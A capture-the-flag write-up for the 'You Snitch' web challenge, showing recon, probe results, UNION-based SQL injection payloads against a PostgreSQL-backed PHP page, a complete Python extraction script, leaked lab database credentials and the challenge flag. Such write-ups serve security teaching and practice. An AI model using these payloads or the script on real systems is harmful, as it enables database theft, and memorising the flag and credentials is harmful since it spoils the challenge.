---
title: "You Snitch"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 450
flag_format: "safctf{...}"
author: "Strawhats"
---

# You Snitch

> **Category:** WEB · **Points:** 450 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: `http://54.72.82.22:8140` (Apache/2.4.68 Debian, PHP/8.3.35)

## Recon

- `GET /` → static "THE DAILY SCOOP" page (Apache, `Last-Modified`/`ETag`, no
  framework fingerprints). Two links:
  - `/secrets.zip` — "Open the press pack"
  - `/lookup.php` — "Search the archive"
- `/secrets.zip` → zip containing `secrets` with Prisma-style Postgres creds:
  `postgresql://olwen:Olwen+SereneVale#2024@localhost:8032/olwendb?schema=public`
  (red herring for direct access — DB bound to localhost; useful context only).
- `GET /lookup.php` → renders `<h1>Newsroom records</h1>` with one row `Olwen`
  and a form `<input name="name">`.

The `name` parameter is reflected into an `<input value="...">` *and* used to
look up records.

## Vulnerability: UNION-based SQL injection in `lookup.php?name=`

The parameter is concatenated raw into a single-column query, e.g.
`SELECT name FROM <t> WHERE name = '$name'`.

Probes:
| input | HTTP | output |
|---|---|---|
| `Olwen` | 200 | lists `Olwen` |
| `Olwen'` | 503 | `Archive database is starting` (syntax error swallowed) |
| `Olwen'--` | 200 | lists `Olwen` (comment closes the string) |
| `Olwen' OR '1'='1` | 200 | lists `Olwen`, `Riann` (two rows exist) |
| `Olwen' AND '1'='2` | 200 | empty list |

Single quote ⇒ HTTP 503 is the error oracle; the row list is the boolean/data
oracle. Confirmed single visible column and UNION:

```
zz' UNION SELECT version()--          -> PostgreSQL 15.19 ... (Alpine musl)
zz' UNION SELECT current_user--       -> snitch_reader
zz' UNION SELECT current_user--       -> snitch_reader
```

(Note: Postgres requires a trailing space for `--` to start a line comment.)

## Exploitation

Schema discovery via `information_schema`:

```
string_agg(table_name,',') FROM information_schema.tables
  -> users, super_secret, ...
string_agg(column_name,',') ... WHERE table_name='super_secret'   -> id,secret
string_agg(column_name,',') ... WHERE table_name='users'          -> id,name
```

Dump the flag column:

```
zz' UNION SELECT id||' => '||secret FROM super_secret--
  -> 1 => safctf{73c4979d1dccb358dbfbaca5233666ca}
```

HTML entity `&gt;` is returned for `>`; the flag itself is plain.

## Notes / gotchas

- Intermittent `HTTP 400 "Invalid case name"` was observed on some larger
  payloads (likely a light input filter / rate limiter). Re-issuing the exact
  same request succeeded; keep payloads short and retry once on 400.
- `SELECT 1 FROM users` (multi-row without aggregation) returned the 503 error
  page — use `string_agg(...)` to collapse multi-row results into one cell.

## Artifacts

- `solve.py` — one-shot extractor: takes base URL, probes `version()`, then
  pulls `string_agg(secret,...) FROM super_secret` and prints the flag.
- `probe.py`, `sqlrun.py` — interactive helpers used during triage.

## Solve script

`web/you-snitch/solve.py`:

```python
#!/usr/bin/env python3
"""
Solve: You Snitch (WEB, 450 pts) -- http://<target>:8140

Vuln: /lookup.php concatenates the `name` request parameter straight into a
PostgreSQL query that returns case names:

    SELECT name FROM <cases> WHERE name = '$name'

Single-quote breaks the query (HTTP 503 "Archive database is starting"); no
error detail is echoed, but the result list *is* rendered, so this is a
classic UNION-based SQL injection with a single visible column:

    ' UNION SELECT <expr>--        (trailing space required by Pg SQL comment)

Data source: /secrets.zip on the site leaks Postgres creds (unrelated to the
exploit path but confirms the DB). The flag lives in table `super_secret`,
column `secret`.

Usage:  python3 solve.py [base_url]
        python3 solve.py http://54.72.82.22:8140
"""
import re
import sys

import requests

TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://54.72.82.22:8140"
LOOKUP = TARGET + "/lookup.php"

# Only one column is selectable through the injection; string_agg / concatenation
# lets us pull whole result sets in a single request.
SQL = "string_agg(secret, ' | ') FROM super_secret"


def sqli(expr, timeout=30):
    """Run `expr` as the injected single-column SELECT; return list of <li> rows."""
    payload = "zz' UNION SELECT " + expr + "-- "
    r = requests.get(LOOKUP, params={"name": payload}, timeout=timeout)
    if r.status_code != 200:
        raise RuntimeError(f"HTTP {r.status_code}: {r.text.strip()[:120]}")
    m = re.search(r"<ul>(.*?)</ul>", r.text, re.S)
    if not m:
        raise RuntimeError("no result list in response")
    rows = re.findall(r"<li>(.*?)</li>", m.group(1), re.S)
    # HTML-unescape the entity-encoded flag
    return [requests.utils.unquote(row.replace("&gt;", ">").replace("&lt;", "<")
                                   .replace("&amp;", "&").replace("&#039;", "'")) for row in rows]


def main():
    # Sanity probe: version() proves the injection is live.
    print("[*] version:", sqli("version()")[0])
    print("[*] current_user:", sqli("current_user")[0])

    print("[*] extracting super_secret.secret ...")
    for row in sqli(SQL):
        print("[+] secret:", row)
        for flag in re.findall(r"safctf\{[0-9a-fA-F]{32}\}", row):
            print("[+] FLAG:", flag)
            return flag
    raise SystemExit("no flag found")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{73c4979d1dccb358dbfbaca5233666ca}
```
